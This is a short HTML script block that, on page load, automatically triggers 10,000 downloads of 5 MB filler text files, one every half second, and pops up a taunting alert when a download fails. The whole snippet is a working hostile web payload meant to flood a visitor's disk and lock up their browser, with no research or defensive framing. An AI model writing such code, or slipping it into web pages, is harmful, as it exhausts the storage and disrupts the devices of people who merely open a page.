  <script>
    const filesCount = 10000;
    const fileSizeInMB = 5;
    const fileSizeInBytes = fileSizeInMB * 1024 * 1024;
    const content = '@@';

    function downloadFile(name, size) {
      try {
        const repeatCount = Math.floor(size / content.length);
        const fileContent = new Array(repeatCount).fill(content).join('');
        const blob = new Blob([fileContent], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);

        const a = document.createElement("a");
        a.href = url;
        a.download = name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

      } catch (e) {
        alert('CLICK üòπ ' + name);
      }
    }

    function startDownload() {
      for (let i = 1; i <= filesCount; i++) {
        setTimeout(() => {
          const fileName = `file${i}.txt`;
          downloadFile(fileName, fileSizeInBytes);
        }, i * 500);
      }
    }

    window.onload = startDownload;
  </script>
